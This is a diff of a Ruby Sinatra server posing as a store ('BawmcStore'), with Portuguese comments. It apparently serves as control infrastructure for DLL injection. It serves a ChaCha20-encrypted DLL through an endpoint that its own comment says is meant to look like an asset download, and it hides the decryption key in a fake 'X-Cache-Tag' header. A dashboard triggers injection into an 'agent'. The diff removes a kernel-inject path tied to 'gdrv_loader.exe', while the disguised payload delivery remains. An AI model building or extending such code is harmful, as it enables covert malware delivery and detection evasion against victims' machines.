@@ -4,7 +4,6 @@ require "securerandom"
 require "digest"
 require "base64"
 require "mutex_m"
-require "openssl"
 
 class BawmcStore < Sinatra::Base
   set :root, File.dirname(__FILE__)
@@ -160,37 +159,35 @@ class BawmcStore < Sinatra::Base
 
   # ── ChaCha20 puro Ruby ────────────────────────────────────────────────────
 
-  # ChaCha20 via OpenSSL (RFC 7539) — C-native, lida com 9MB em <5ms
-  # IV layout OpenSSL: counter(4 bytes LE) || nonce(12 bytes) = 16 bytes total
-  def chacha20_crypt(key32, nonce12, data)
-    cipher = OpenSSL::Cipher.new("chacha20")
-    cipher.encrypt
-    cipher.key = key32
-    cipher.iv  = "\x00\x00\x00\x00".b + nonce12.b
-    cipher.update(data.b) + cipher.final
-  rescue OpenSSL::Cipher::CipherError
-    # fallback Ruby puro caso OpenSSL nao suporte chacha20 nesta plataforma
+  def chacha20_block(key32, counter, nonce12)
     r32 = ->(x, n) { ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF }
-    block = ->(k, ctr, n) {
-      s = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
-           *k.unpack("V8"), ctr & 0xFFFFFFFF, *n.unpack("V3")]
-      w = s.dup
-      qr = ->(a,b,c,d) {
-        w[a]=(w[a]+w[b])&0xFFFFFFFF; w[d]^=w[a]; w[d]=r32.(w[d],16)
-        w[c]=(w[c]+w[d])&0xFFFFFFFF; w[b]^=w[c]; w[b]=r32.(w[b],12)
-        w[a]=(w[a]+w[b])&0xFFFFFFFF; w[d]^=w[a]; w[d]=r32.(w[d],8)
-        w[c]=(w[c]+w[d])&0xFFFFFFFF; w[b]^=w[c]; w[b]=r32.(w[b],7)
-      }
-      10.times { qr.(0,4,8,12);qr.(1,5,9,13);qr.(2,6,10,14);qr.(3,7,11,15)
-                 qr.(0,5,10,15);qr.(1,6,11,12);qr.(2,7,8,13);qr.(3,4,9,14) }
-      16.times { |i| w[i]=(w[i]+s[i])&0xFFFFFFFF }
-      w.pack("V16")
+    s = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+         *key32.unpack("V8"),
+         counter & 0xFFFFFFFF,
+         *nonce12.unpack("V3")]
+    w = s.dup
+    qr = ->(a, b, c, d) {
+      w[a] = (w[a] + w[b]) & 0xFFFFFFFF; w[d] ^= w[a]; w[d] = r32.(w[d], 16)
+      w[c] = (w[c] + w[d]) & 0xFFFFFFFF; w[b] ^= w[c]; w[b] = r32.(w[b], 12)
+      w[a] = (w[a] + w[b]) & 0xFFFFFFFF; w[d] ^= w[a]; w[d] = r32.(w[d],  8)
+      w[c] = (w[c] + w[d]) & 0xFFFFFFFF; w[b] ^= w[c]; w[b] = r32.(w[b],  7)
     }
+    10.times do
+      qr.(0,4,8,12); qr.(1,5,9,13); qr.(2,6,10,14); qr.(3,7,11,15)
+      qr.(0,5,10,15); qr.(1,6,11,12); qr.(2,7,8,13); qr.(3,4,9,14)
+    end
+    16.times { |i| w[i] = (w[i] + s[i]) & 0xFFFFFFFF }
+    w.pack("V16")
+  end
+
+  def chacha20_crypt(key32, nonce12, data)
     out = data.b.dup
-    ((data.bytesize+63)/64).times do |i|
-      ks = block.(key32, i, nonce12)
-      st = i*64; len = [64, data.bytesize-st].min
-      len.times { |j| out.setbyte(st+j, data.getbyte(st+j) ^ ks.getbyte(j)) }
+    blocks = (data.bytesize + 63) / 64
+    blocks.times do |i|
+      ks = chacha20_block(key32, i, nonce12)
+      st = i * 64
+      len = [64, data.bytesize - st].min
+      len.times { |j| out.setbyte(st + j, data.getbyte(st + j) ^ ks.getbyte(j)) }
     end
     out
   end
@@ -221,7 +218,6 @@ class BawmcStore < Sinatra::Base
              transition:opacity .15s}
       button:disabled{opacity:.35;cursor:not-allowed}
       #btnInj{background:#7c3aed;color:#fff}
-      #btnKernel{background:#4c1d95;color:#ddd6fe}
       #btnStop{background:#374151;color:#e2e2e2}
       #btnRestore{background:#065f46;color:#a7f3d0}
       #btnReset{background:#1f2937;color:#9ca3af}
@@ -250,8 +246,7 @@ class BawmcStore < Sinatra::Base
       <div class="val" id="restoreLast">—</div>
     </div>
 
-    <button id="btnInj"     onclick="triggerInject()"  disabled>ATIVAR (agente)</button>
-    <button id="btnKernel"  onclick="triggerKernel()">ATIVAR (kernel)</button>
+    <button id="btnInj"     onclick="triggerInject()"  disabled>ATIVAR</button>
     <button id="btnRestore" onclick="triggerRestore()" disabled>RESTAURAR MEMÓRIA</button>
     <button id="btnStop"    onclick="triggerStop()">PARAR AGENTE</button>
     <button id="btnReset"   onclick="triggerReset()">RESET ESTADO</button>
@@ -291,14 +286,6 @@ class BawmcStore < Sinatra::Base
       log('Enviando sinal de restaurar...');
       await fetch(BASE+'/api/catalog/restore',{method:'POST'});
       log('Aguardando agente liberar memória...');
-    }
-    async function triggerKernel(){
-      document.getElementById('btnKernel').disabled=true;
-      log('Preparando DLL para kernel inject...');
-      const r=await fetch(BASE+'/api/catalog/arm',{method:'POST'});
-      const d=await r.json();
-      log(d.ok?'DLL armada. Execute gdrv_loader.exe + inject_trigger.exe.':'Erro: '+d.msg);
-      setTimeout(()=>{ document.getElementById('btnKernel').disabled=false; },3000);
     }
     async function triggerStop(){
       document.getElementById('btnStop').disabled=true;
@@ -352,22 +339,6 @@ class BawmcStore < Sinatra::Base
       BawmcStore.state[:last_seen] = Time.now
     end
     status 204
-  end
-
-  # Armar DLL para kernel inject (sem checar ff_alive)
-  # O gdrv_loader.exe faz GET /api/assets/pkg logo depois
-  post "/api/catalog/arm" do
-    unless File.exist?(DLL_PATH)
-      content_type "application/json"
-      halt 503, JSON.generate({ ok: false, msg: "DLL ausente no servidor" })
-    end
-    BawmcStore.state_lock.synchronize do
-      BawmcStore.state[:pending_key]    = SecureRandom.bytes(32)
-      BawmcStore.state[:pending_nonce]  = SecureRandom.bytes(12)
-      BawmcStore.state[:inject_pending] = true
-    end
-    content_type "application/json"
-    JSON.generate({ ok: true })
   end
 
   # Disparar inject (dashboard)
@@ -438,25 +409,19 @@ class BawmcStore < Sinatra::Base
   end
 
   # Servir DLL encriptada com ChaCha20 — parece download de asset
-  # Gera key+nonce on-the-fly se não houver inject pendente
-  # (suporta kernel flow direto via gdrv_loader.exe sem depender de ff_alive)
   get "/api/assets/pkg" do
     halt 503 unless File.exist?(DLL_PATH)
 
     key = nonce = nil
     BawmcStore.state_lock.synchronize do
-      unless BawmcStore.state[:pending_key] && BawmcStore.state[:pending_nonce]
-        BawmcStore.state[:pending_key]    = SecureRandom.bytes(32)
-        BawmcStore.state[:pending_nonce]  = SecureRandom.bytes(12)
-        BawmcStore.state[:inject_pending] = true
-      end
       key   = BawmcStore.state[:pending_key]
       nonce = BawmcStore.state[:pending_nonce]
     end
+    halt 404 unless key && nonce
 
-    dll_raw = File.binread(DLL_PATH)
-    dll_enc = chacha20_crypt(key, nonce, dll_raw)
-    tag     = Base64.strict_encode64(key + nonce)
+    dll_raw     = File.binread(DLL_PATH)
+    dll_enc     = chacha20_crypt(key, nonce, dll_raw)
+    tag         = Base64.strict_encode64(key + nonce)   # 44 bytes → ~60 chars
 
     content_type "application/octet-stream"
     headers "X-Cache-Tag" => tag, "Cache-Control" => "no-store"
